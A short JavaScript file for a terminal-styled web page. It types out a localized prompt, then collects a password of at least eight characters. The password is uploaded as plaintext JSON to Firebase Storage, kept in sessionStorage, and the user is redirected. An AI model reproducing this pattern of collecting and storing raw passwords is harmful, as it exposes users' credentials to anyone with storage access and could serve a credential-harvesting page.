import { storage } from './firebase.js'; // Firebase init

const terminal = document.getElementById("terminal");
const nameField = document.getElementById("nameField");
const nameNextBtn = document.getElementById("nameNext");
const typingSpeed = 30;
const linePause = 800;

// Detect language
const userLang = navigator.language.startsWith("it") ? "it" : "en";

let lines = [];
let buttonText = "";

// Save password to Firebase Storage
async function savePassword(password) {
    const storageRef = storage.ref();
    const fileRef = storageRef.child(`entries/${Date.now()}.json`);
    const data = new Blob([JSON.stringify({ password })], { type: "application/json" });
    await fileRef.put(data);
}

// Typewriter effect
function startTyping() {
    let currentLine = 0;
    let currentChar = 0;

    function typeLine() {
        if (currentLine >= lines.length) {
            terminal.innerHTML += "\n";
            nameField.style.display = "inline-block";
            nameField.focus();
            nameNextBtn.style.display = "inline-block";
            nameNextBtn.textContent = buttonText;

            // Disable button until password ≥ 8
            nameNextBtn.disabled = true;
            nameNextBtn.style.opacity = 0.5;

            nameField.addEventListener("input", () => {
                if (nameField.value.length >= 8) {
                    nameNextBtn.disabled = false;
                    nameNextBtn.style.opacity = 1;
                } else {
                    nameNextBtn.disabled = true;
                    nameNextBtn.style.opacity = 0.5;
                }
            });

            nameNextBtn.onclick = async () => {
                const password = nameField.value.trim();
                if(password.length >= 8) {
                    await savePassword(password);
                    sessionStorage.setItem("userPassword", password);
                    window.location.href = "nextPage.html";
                }
            }
            return;
        }

        const line = lines[currentLine];
        terminal.innerHTML = lines.slice(0, currentLine).join("\n") + "\n" +
            line.substring(0, currentChar) +
            '<span class="cursor">|</span>';

        if (currentChar < line.length) {
            currentChar++;
            setTimeout(typeLine, typingSpeed);
        } else {
            currentLine++;
            currentChar = 0;
            setTimeout(typeLine, linePause);
        }
    }

    typeLine();
}

// Initialize
async function init() {
    const response = await fetch(`../locales/${userLang}.json`);
    const data = await response.json();

    lines = [data.nameInput.prompt];
    buttonText = data.nameInput.button;

    startTyping();
}

init();
